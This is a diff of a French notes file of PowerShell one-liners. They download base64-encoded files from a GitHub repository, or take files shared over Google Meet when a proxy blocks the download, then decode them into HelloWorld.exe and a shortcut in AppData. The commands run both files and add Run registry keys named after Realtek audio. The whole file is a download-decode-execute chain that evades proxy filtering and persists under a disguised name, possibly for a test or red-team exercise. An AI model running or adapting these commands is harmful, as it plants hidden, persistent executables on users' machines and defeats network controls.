@@ -14,11 +14,22 @@ $p="$env:APPDATA\HelloWorld.exe"; Invoke-WebRequest $u -OutFile $p; Unblock-File
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Realtek HD Audio" -Value $p;
 
 
+
 En cas de filtrage trop strict par le proxy
 ============
-Partager par GoogleMeet les fichiers HelloWorld.dat et Poeme-Victor.Hugo.dat
+Partager par GoogleMeet les fichiers HelloWorld.dat et Poeme-Victor.Hugo.dat, à mettre en place sous C:\Users\<User>\AppData\Roaming
 
 Puis :
+
+# Pour regénérer HelloWorld.exe qui avait été encodé en b64 - sans DL (checké REMW)
+$outputFilePath="$env:APPDATA\HelloWorld.exe";
+$p="$env:APPDATA\HelloWorld.dat";
+$base64String=Get-Content -Path $p -Raw;
+$decodedBytes=[convert]::FromBase64String($base64String);
+[IO.File]::WriteAllBytes($outputFilePath, $decodedBytes)
+
+Start-Process $outputFilePath; Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Realtek1 -Value $outputFilePath
+
 
 # Pour regénérer Poeme-Victor.Hugo.lnk qui avait été encodé en b64 - sans DL (checké REMW)
 $outputFilePath="$env:APPDATA\Poeme-Victor.Hugo.lnk";
@@ -30,17 +41,17 @@ $decodedBytes=[convert]::FromBase64String($base64String);
 Start-Process $outputFilePath; Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Realtek2 -Value $outputFilePath
 
 
-# Pour regénérer HelloWorld.exe qui avait été encodé en b64 - sans DL (checké REMW)
-$outputFilePath="$env:APPDATA\HelloWorld.exe"
-$p="$env:APPDATA\HelloWorld.dat"
-$base64String=Get-Content -Path $p -Raw
-$decodedBytes=[convert]::FromBase64String($base64String)
+# DL de Poeme-Victor.Hugo.dat et regénération du .lnk (si accès ok à raw.githubusercontent.com)
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $u="https://raw.githubusercontent.com/rvbrio/Test/main/Poeme-Victor.Hugo.dat";
+$p="$env:APPDATA\Poeme-Victor.Hugo.dat"; Invoke-WebRequest $u -OutFile $p; Unblock-File $p;
+$outputFilePath="$env:APPDATA\Poeme-Victor.Hugo.lnk"; $base64String=Get-Content -Path $p -Raw;
+$decodedBytes=[convert]::FromBase64String($base64String);
 [IO.File]::WriteAllBytes($outputFilePath, $decodedBytes)
 
-Start-Process $outputFilePath; Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Realtek1 -Value $outputFilePath
+Start-Process $outputFilePath; 
 
 
-# DL de HelloWorld.dat, regénération du .exe - A REVOIR (pb de résolution DNS de raw.githubusercontent.com le 10/09/2026 ?)
+# DL de HelloWorld.dat et regénération du .exe (si accès ok à raw.githubusercontent.com)
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $u="https://raw.githubusercontent.com/rvbrio/Test/main/HelloWorld.dat";
 $p="$env:APPDATA\HelloWorld.dat"; Invoke-WebRequest $u -OutFile $p; Unblock-File $p;
 $outputFilePath="$env:APPDATA\HelloWorld.exe"; $base64String=Get-Content -Path $p -Raw;
@@ -48,4 +59,6 @@ $decodedBytes=[convert]::FromBase64String($base64String);
 [IO.File]::WriteAllBytes($outputFilePath, $decodedBytes)
 
 Start-Process $outputFilePath; 
+
+
 
